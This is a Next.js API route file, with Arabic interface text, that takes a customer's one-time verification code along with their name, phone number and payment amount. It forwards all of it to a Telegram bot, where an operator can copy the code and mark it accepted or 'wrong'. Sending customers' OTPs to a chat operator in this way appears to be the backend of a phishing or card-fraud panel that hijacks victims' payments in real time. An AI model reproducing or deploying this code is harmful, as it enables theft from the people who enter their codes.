import { NextRequest, NextResponse } from "next/server";
import { getOrderBot, sendTelegramMessage } from "../../lib/telegramBots";
import { updateVerifyStatusLocally, fetchVerifyStatus } from "../../lib/verifyStatus";

export const dynamic = "force-dynamic";

const attempts = new Map<string, { count: number; firstAt: number; lastAt: number }>();
const MAX_ATTEMPTS = 8;
const WINDOW_MS = 10 * 60 * 1000;

// GET /api/verify?orderId=XXXX - Check live verification status
export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const orderId = searchParams.get("orderId");

  if (!orderId) {
    return NextResponse.json({ ok: false, error: "Missing orderId" }, { status: 400 });
  }

  const status = await fetchVerifyStatus(orderId);
  return NextResponse.json({ ok: true, orderId, status });
}

// POST /api/verify - Customer submits OTP code
export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => ({}));
  const { code, orderId, customerName, phone, amount } = body;

  if (!code || !orderId) {
    return NextResponse.json({ ok: false, error: "بيانات ناقصة" }, { status: 400 });
  }

  const cleanOrderId = String(orderId).trim();
  const now = Date.now();
  const entry = attempts.get(cleanOrderId);

  if (entry) {
    if (now - entry.firstAt > WINDOW_MS) {
      attempts.delete(cleanOrderId);
    } else {
      if (entry.count >= MAX_ATTEMPTS) {
        return NextResponse.json({ ok: false, error: "تجاوزت الحد المسموح من المحاولات" }, { status: 429 });
      }
      entry.count += 1;
      entry.lastAt = now;
    }
  }

  if (!attempts.has(cleanOrderId)) {
    attempts.set(cleanOrderId, { count: 1, firstAt: now, lastAt: now });
  }

  // Reset status to pending for this new code submission
  updateVerifyStatusLocally(cleanOrderId, "pending");

  // Determine target bot according to live distribution system (Bot 1 or Bot 2)
  const targetBot = getOrderBot(cleanOrderId);

  const text = [
    `🔐 كود تحقق أمان جديد وصل الآن!`,
    `━━━━━━━━━━━━━━━━━━`,
    `🆔 رقم الطلب: <code>${cleanOrderId}</code>`,
    `👤 اسم العميل: ${customerName || "—"}`,
    `📱 رقم الهاتف: <code>${phone || "—"}</code>`,
    `💰 المبلغ: <b>${amount ? `${amount} ر.س` : "—"}</b>`,
    `📟 الكود المدخل: <b><code>${code}</code></b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `👇 حدد الإجراء المطلوب للعميل الآن:`,
  ].join("\n");

  const sent = await sendTelegramMessage(targetBot, {
    text,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ تأكيد الطلب (قبول)", callback_data: `v_app_${cleanOrderId}` },
          { text: "❌ كود خاطئ (رفض)", callback_data: `v_rej_${cleanOrderId}` },
        ],
        [
          { text: `📋 نسخ الكود: ${code}`, copy_text: { text: String(code) } },
        ],
      ],
    },
  });

  return NextResponse.json({ ok: sent, orderId: cleanOrderId, status: "pending" });
}
